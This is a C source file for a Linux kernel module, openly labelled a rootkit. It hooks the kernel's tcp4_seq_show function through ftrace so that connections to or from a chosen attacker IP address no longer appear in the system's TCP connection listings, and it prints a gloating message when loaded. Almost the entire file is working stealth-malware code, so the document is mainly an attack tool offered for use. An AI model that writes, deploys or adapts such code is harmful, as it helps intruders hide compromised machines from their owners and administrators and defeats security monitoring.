#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>

#include "ftrace_helper.h"

# define IP_ADDRESS_TO_HIDE "111.222.333.444"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Modifed by elefr3n, original author TheXcellerator");
MODULE_DESCRIPTION("Hiding connections from attacker ip");
MODULE_VERSION("0.01");

/*
* Convert ip string to int
*/
unsigned int ip_to_int (const char * ipstr)
{
    unsigned v = 0;
    int i;
    const char * start;

    start = ipstr;
    for (i = 0; i < 4; i++) {
        char c;
        int n = 0;
        while (1) {
            c = * start;
            start++;
            if (c >= '0' && c <= '9') {
                n *= 10;
                n += c - '0';
            }
            else if ((i < 3 && c == '.') || i == 3) {
                break;
            }
        }
        v *= 256;
        v += n;
    }
    return v;
}

/* Function declaration for the original tcp4_seq_show() function that we
 * are going to hook.
 * */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/* This is our hook function for tcp4_seq_show */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    int ipnlong = htonl(ip_to_int(IP_ADDRESS_TO_HIDE));

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;

		if(ipnlong == is->inet_daddr || ipnlong == is->inet_saddr){
			return 0;
		}
	}

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

/* We are going to use the fh_install_hooks() function from ftrace_helper.h
 * in the module initialization function. This function takes an array of 
 * ftrace_hook structs, so we initialize it with what we want to hook
 * */
static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Simply call fh_install_hooks() with hooks (defined above) */
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	/* Simply call fh_remove_hooks() with hooks (defined above) */
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
